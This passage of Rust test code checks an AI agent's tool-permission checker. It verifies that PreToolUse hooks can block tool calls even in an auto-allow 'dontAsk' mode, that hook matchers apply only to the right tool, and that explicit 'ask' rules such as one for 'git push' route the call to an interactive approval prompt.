    async fn pretooluse_hook_actually_runs_and_blocks() {
        // A real PreToolUse hook that (a) creates a marker file proving it ran, and
        // (b) exits 2 to block — even in dontAsk mode which normally auto-allows.
        let marker = std::env::temp_dir().join(format!("trogon_pretooluse_{}.marker", std::process::id()));
        let _ = std::fs::remove_file(&marker);
        let command = format!("touch '{}'; echo blocked-by-policy >&2; exit 2", marker.display());

        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let mut checker = full_checker("dontAsk", tx, None, vec![], None);
        checker.pre_tool_use = pre_hook("", &command);

        let allowed = checker
            .check("tc", "Bash", &serde_json::json!({"command": "ls"}))
            .await;
        assert!(!allowed, "blocking PreToolUse hook must deny even in dontAsk");
        assert!(marker.exists(), "the PreToolUse hook actually executed (marker file created)");
        let _ = std::fs::remove_file(&marker);
    }

    #[tokio::test]
    async fn pretooluse_non_blocking_hook_falls_through() {
        // A passing PreToolUse hook (exit 0) doesn't block → dontAsk auto-allows.
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let mut checker = full_checker("dontAsk", tx, None, vec![], None);
        checker.pre_tool_use = pre_hook("Bash", "exit 0");
        assert!(
            checker
                .check("tc", "Bash", &serde_json::json!({"command": "ls"}))
                .await,
            "non-blocking PreToolUse hook must not deny"
        );
    }

    #[tokio::test]
    async fn pretooluse_hook_only_runs_for_matching_tool() {
        // Matcher is "Bash" but the tool is Read → hook skipped → not blocked.
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let mut checker = full_checker("dontAsk", tx, None, vec![], None);
        checker.pre_tool_use = pre_hook("Bash", "exit 2");
        assert!(
            checker
                .check("tc", "read_file", &serde_json::json!({"path": "a.rs"}))
                .await,
            "PreToolUse matcher must not fire for a non-matching tool"
        );
    }

    #[tokio::test]
    async fn mode_checker_dont_ask_explicit_ask_rule_prompts_via_channel() {
        // An explicit `ask` rule must force the interactive prompt even in dontAsk
        // mode (which otherwise auto-allows). The responder DENIES; the call can only
        // return false if it actually routed through the channel — a plain dontAsk
        // auto-allow would return true, so this discriminates the fix from a no-op.
        let (tx, mut rx) = mpsc::channel(1);
        let checker = ModePermissionChecker {
            mode: "dontAsk".to_string(),
            inner: make_rules_checker("ask_commands: git push", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        let got_request = tokio::spawn(async move {
            match rx.recv().await {
                Some(req) => {
                    let _ = req.response_tx.send(false); // deny at the prompt
                    true
                }
                None => false,
            }
        });
        assert!(
            !checker
                .check(
                    "tc-daa",
                    "bash",
                    &serde_json::json!({"command": "git push origin main"}),
                )
                .await,
            "explicit ask rule must route to the prompt; denied there → false"
        );
        assert!(
            got_request.await.unwrap(),
            "the interactive channel must have received the request (not auto-allowed)"
        );
    }
}
